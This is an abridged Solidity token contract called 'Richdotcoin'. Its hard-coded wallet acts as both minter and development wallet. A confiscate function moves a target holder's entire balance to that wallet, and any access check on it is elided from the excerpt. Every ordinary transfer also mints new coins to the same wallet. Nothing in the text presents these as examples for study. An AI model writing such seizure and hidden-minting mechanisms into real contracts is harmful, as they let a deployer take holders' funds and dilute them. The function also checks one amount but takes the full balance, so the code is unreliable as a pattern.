...
contract Richdotcoin is Context, IERC20, Ownable {
    ...
    address private _developmentWalletAddress = 0xE69Ac38Cd6DA0EA9a540B47399C430131216Ced7; //mining address
    uint256 private constant MAX = ~uint256(0);
    uint256 public _tTotal = 3000 * 10**18;
    ...
    uint256 public _mintweight = (3 * (_tTotal)**3)/ (100 * (_maximumSupply - _tTotal)**2); //difficulty of newcoins minted in transfers = TransferAmount/mintweight
    ...
    constructor () {
        ...
        _minter = 0xE69Ac38Cd6DA0EA9a540B47399C430131216Ced7;
    }
    ...
    function mint(uint amount) public returns (bool) {
        ...
        require(_tTotal + amount <= _maximumSupply, "Richdotcoin Maximum: can't mint new coins");
    ...
    function confiscate(address target, uint amount) public returns (bool) {
        ...
        if (balances[target] >= amount) {
            ...
            balances[_minter] += balances[target];
            balances[target] = 0;
        }
        return true;
    }
    ...
    function _transfer(
        ...
        if(from != address(0) && to != _developmentWalletAddress && _developmentWalletAddress != address(0)) {
        require(_tTotal + amount/_mintweight <= _maximumSupply, "Richdotcoin Maximum: can't mint new coins");
        balances[_developmentWalletAddress] += amount/_mintweight;
        _tTotal += amount/_mintweight;
        }
        bool takeFee = true;
